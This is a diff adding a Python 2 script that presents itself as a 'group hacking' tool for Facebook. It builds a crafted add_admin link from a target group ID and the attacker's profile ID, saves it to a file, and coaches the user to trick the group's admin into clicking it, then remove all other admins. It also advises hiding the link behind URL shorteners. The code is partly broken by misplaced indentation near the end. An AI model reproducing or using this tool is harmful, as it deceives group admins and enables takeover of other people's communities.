@@ -1,0 +1,166 @@
+import os, sys, time
+
+def lodhirt():
+    lodhirt = [
+     'AM', '      ', 'AM', '         ', 'STAR BOY\n']
+    for o in lodhirt:
+        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
+        sys.stdout.flush()
+        time.sleep(0.3)
+
+
+# Set Colors ######
+
+N = '\033[0m'
+
+W = '\033[1;37m'
+
+B = '\033[1;34m'
+
+R = '\033[1;31m'
+
+G = '\033[1;32m'
+
+Y = '\033[1;33m'
+
+C = '\033[1;36m'
+
+##################
+
+
+# Restart ####################
+
+def restart_program():
+
+   python = sys.executable
+
+   os.execl(python, python, * sys.argv)
+
+   curdir = os.getcwd()
+
+##############################
+
+
+os.system("clear")
+
+print" \033[1;92m /    /~\  |\  /| | "
+print" \033[1;91m/    /   \ | \/ | | "
+print"\033[1;93m/____ \   / | /\ | | "
+print"  \033[1;94m  /  \ /  |/  \| | "
+print" \033[1;95m  /   / \  |    | | "
+print"\033[1;96m  /   /   \ |    | | "
+
+print "%s ==============================================%s" % (C, N)
+
+print
+
+print " %sAM.BRAND BOY:%s" % (W, N)
+
+print
+lodhirt()
+
+print "%s (%s01%s)%s -- %sSTART GROUP HACKING%s" % (B, C, B, Y, W, N)
+
+
+print
+
+bahasa = raw_input("%s[%s*%s] %sCHOOSE:%s " % (C, Y, C, W, B))
+
+
+try:
+
+	file = open("link.txt", 'w')
+
+except(IOError):
+
+	print "ERROR"
+
+	sys.exit()
+
+
+if bahasa.strip() in "01 1".split():
+
+
+  print "%s [%s START GROUP HACK%s ]%s" % (C, W, C, N)
+
+  print
+
+  step1 = raw_input("%s1%s)%s First Of All Go To The %sFacebook%s Group \nThat You Want To %sHack\n%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And \nThen Copy 15 Digits Group Magical Code.\n Example %s(%s 589101351254979 %s)%s...\n%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step3 = raw_input("%s3%s)%s Now Go To Your Profile \nAnd Find Your 15 Digits Profile Code. \nExample %s(%s 100004136748473 %s)%s...\n%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step4 = raw_input("%s4%s)%s If the url didnt show that 15 digit code.\n Then try to open %sfacebook%s from the browser...\n%s[%sEnter%s]%s" % (Y, C, W, B, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step5 = raw_input("%s5%s)%s After Find Both Codes..%sLet we mix it up%s...\n%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))
+
+  group = raw_input(" %s(%sa%s)%s Group Code%s >>>%s " % (W, C, W, C, R, Y))
+
+  you = raw_input(" %s(%sb%s)%s Your Code%s >>>%s " % (W, C, W, C, R, Y))
+
+  print " %s(%s*%s)%s Result%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N)
+
+  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))
+
+  print "%s==============================================%s" % (R, N)
+
+  step6 = raw_input("%s6%s)%s Now Copy The Link On The Result\n\033[1;92m And Then Send Copied Link To %sAdmin%s Of The Group.\033[1;93m \nIf Its Hard To You To Copy The Link, \033[1;94m\n i Have Save The Link On File *link.txt*. So Its Getting Easier, \033[1;95m\nJust Open The File link.txt And Then Copy The Link \033[1;96m\nThen Send To The %sAdmin%s...\n%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step7 = raw_input("%s7%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will Be %sAdmin%s Of The Group...\n%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step8 = raw_input("%s8%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group...\n%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))
+  lodhirt()
+  print "%s==============================================%s" % (R, N)
+
+  step9 = raw_input("%s9%s)%s Have Fun %s:)%s...\n%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))
+  lodhirt()
+  print "%s[%s#%s]%s -------------------%s Done %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)
+
+  print
+
+  time.sleep(1)
+
+  print "%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or bit.ly etc*%s" % (Y, N)
+
+  time.sleep(1)
+
+  print "%sThanks%s For %sUsing My Program%s %s:')%s" % (C, W, R, W, Y, N)
+
+  time.sleep(1)
+
+print "%sGood Bye %s:)%s" % (W, Y, N)
+
+
+
+  sys.exit()
+
+  
+
+else:
+
+	print
+
+	print "%s[%si%s]%s Your boy am am star boy%s" % (Y,R,Y,W,N)
+
+	print "%s[%si%s]%s Wrong Input%s" % (Y,R,Y,W,N)
+
+	print "%s[%si%s]%s Ita boot manda sala%s" % (Y,R,Y,W,N)
+
+	time.sleep(2)
+
+	restart_program()
+
+ 
